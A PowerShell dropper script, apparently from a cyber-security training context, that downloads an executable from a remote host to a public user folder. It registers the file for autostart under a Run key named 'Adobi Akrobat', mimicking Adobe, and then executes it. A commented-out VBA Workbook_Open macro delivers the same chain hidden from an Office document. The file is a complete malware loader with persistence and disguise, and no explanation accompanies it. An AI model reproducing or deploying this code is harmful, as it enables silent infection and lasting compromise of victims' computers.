$payload = 'http://data.cyber.org.il/os/hero.exe' 
$local_path = 'C:\Users\Public\nookMgr.exe' 
$client = New-Object System.Net.WebClient

# Using WinAPI .Net class for allowing download file:
[System.Net.ServicePointManager]::Expect100Continue = $true
[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12

$client.DownloadFile($payload, $local_path) 
if(-not (Test-Path $local_path -PathType Leaf)) { exit }
New-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersion\Run', -Name 'Adobi Akrobat' -Value $local_path -PropertyType 'String'  
IEX "$local_path"

#Using VBA (Running for office programs):
# Sub Workbook_Open()
#  Call Shell("powershell.exe -noexit -Command " & _
#  "$payload = 'http://data.cyber.org.il/os/hero.exe';" & _
#  "$local_path = 'C:\Users\Public\nookMgr.exe';" & _
#  "$client = New-Object System.Net.WebClient;" & _
#  "[System.Net.ServicePointManager]::Expect100Continue = $true;" & _
#  "[System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12;" & _
#  "$client.DownloadFile($payload, $local_path);" & _
#  "if(-not (Test-Path $local_path -PathType Leaf)) { exit }; " & _
#  "New-ItemProperty -Path 'HKCU:Software\Microsoft\Windows\CurrentVersion\Run' " & _
#  "-Name 'Adobi Akrobat' -Value $local_path -PropertyType 'String' ;" & _
#  "IEX $local_path ;" _
#  , vbHide)
# End Sub